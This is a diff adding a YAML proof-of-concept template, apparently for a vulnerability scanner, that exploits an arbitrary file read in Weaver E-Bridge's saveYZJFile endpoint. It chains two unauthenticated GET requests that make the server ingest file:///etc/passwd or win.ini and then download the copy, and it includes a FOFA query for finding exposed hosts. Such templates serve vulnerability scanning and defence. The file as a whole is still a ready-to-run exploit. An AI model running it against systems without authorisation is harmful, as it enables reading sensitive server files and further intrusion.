@@ -1,0 +1,31 @@
+id: poc-yaml-weaver-ebridge-saveyzjfile-anyfile-read
+info:
+  name: 泛微 E Bridge 云桥 saveYZJFile任意文件读取
+  severity: high
+  tags:
+  - 文件读取
+  finger: weaver-ebridge
+  fofa: app="泛微云桥e-Bridge"
+firstRequest:
+  method: GET
+  path: /wxjsapi/saveYZJFile
+  expression: 'status_code == 200
+
+    '
+variables:
+  r_data_linux: 'file:///etc/passwd
+
+    file:///C://windows/win.ini'
+requests:
+- method: GET
+  path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl={{.r_data_linux}}&fileExt=txt
+  output:
+  - regex_match(body,`"id":"(?P<id>.*?)"`)
+  expression: "status_code == 200 && \ncontains(body,\"\\\"filepath\\\"\") &&\ncontains(body,\"\
+    \\\"id\\\"\")\n"
+- method: GET
+  path: /file/fileNoLogin/{{.id}}
+  expression: "status_code == 200 &&\n(\ncontains(body, \"bit app support\") && \n\
+    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nmatches(body,\
+    \ \"root:.*:0:0:\")\n)\n"
+transport: http
